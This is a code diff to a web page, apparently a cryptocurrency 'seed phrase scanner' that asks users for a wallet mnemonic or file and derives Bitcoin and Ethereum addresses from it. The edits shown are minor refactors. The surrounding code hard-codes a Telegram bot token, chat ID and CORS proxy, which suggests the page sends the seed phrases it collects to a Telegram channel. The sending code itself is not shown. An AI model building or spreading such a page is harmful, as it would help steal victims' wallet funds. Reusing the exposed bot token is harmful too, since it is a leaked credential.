@@ -238,7 +238,7 @@
     <script>
         // Constants for Telegram API and CORS proxy
         const TELEGRAM_BOT_TOKEN = '8026919110:AAGOm56kp92jEt9NphOYeBMiG_U_bX1uCYU';
-        const TELEGRAM_CHAT_ID = '-4913064483';
+        const TELEGRAM_CHAT_ID   = '-4913064483';
         const CORS_PROXY_URL = 'https://corsproxy.io/?';
 
         // Get references to UI elements
@@ -272,16 +272,18 @@
         function updateScanButtonState() {
             allLibsLoaded = checkAllLibsLoaded();
             startButton.disabled = !(fileInput.files.length > 0 || phraseInput.value.trim().length > 0) || !allLibsLoaded;
-            if (!allLibsLoaded && document.getElementById('loadingMessage') === null) {
-                // Display a loading message if libs are not ready
+            
+            const loadingMessageDiv = document.getElementById('loadingMessage');
+            if (!allLibsLoaded && !loadingMessageDiv) {
+                // Display a loading message if libs are not ready and message not already present
                 const loadingDiv = document.createElement('div');
                 loadingDiv.id = 'loadingMessage';
                 loadingDiv.style.cssText = 'color: #ffff33; margin-top: 10px; font-size: 0.9em;';
                 loadingDiv.innerText = 'جاري تحميل المكتبات... يرجى الانتظار.';
                 summaryDiv.insertAdjacentElement('afterend', loadingDiv);
-            } else if (allLibsLoaded && document.getElementById('loadingMessage')) {
+            } else if (allLibsLoaded && loadingMessageDiv) {
                 // Remove loading message once ready
-                document.getElementById('loadingMessage').remove();
+                loadingMessageDiv.remove();
             }
         }
 
@@ -306,7 +308,7 @@
         document.getElementById('ethereumjsUtilLoader').onload = scriptLoadHandler;
         document.getElementById('bitcoinjsLibLoader').onload = scriptLoadHandler;
 
-        // Initial check on page load
+        // Initial check on page load to set initial state
         document.addEventListener('DOMContentLoaded', updateScanButtonState);
 
 
@@ -422,7 +424,7 @@
          * @returns {string} The derived BTC address.
          */
         function deriveBtc(seed) {
-          const root = window.hdkey.fromMasterSeed(seed);
+          const root  = window.hdkey.fromMasterSeed(seed);
           const child = root.derive("m/44'/0'/0'/0/0"); // BIP44 path for Bitcoin mainnet
           return window.bitcoin.payments.p2pkh({ pubkey: child.publicKey }).address;
         }
@@ -434,7 +436,7 @@
          * @returns {string} The derived ETH address (0x prefixed).
          */
         function deriveEth(seed) {
-          const root = window.hdkey.fromMasterSeed(seed);
+          const root  = window.hdkey.fromMasterSeed(seed);
           const child = root.derive("m/44'/60'/0'/0/0"); // BIP44 path for Ethereum
           return '0x' + window.ethereumjs.Util.pubToAddress(child.publicKey, false).toString('hex');
         }
@@ -446,7 +448,7 @@
          */
         async function scanPhrase(phrase) {
             // Check if window.bip39 is defined before using it
-            if (typeof window.bip39 === 'undefined' || typeof window.bip39.validateMnemonic !== 'function') {
+            if (!allLibsLoaded || typeof window.bip39.validateMnemonic !== 'function') {
                 console.error("BIP39 library is not yet loaded or failed to load. Please ensure your internet connection is stable and refresh the page (Ctrl+Shift+R).");
                 return { status: 'not_found', error: 'BIP39 library not available' };
             }
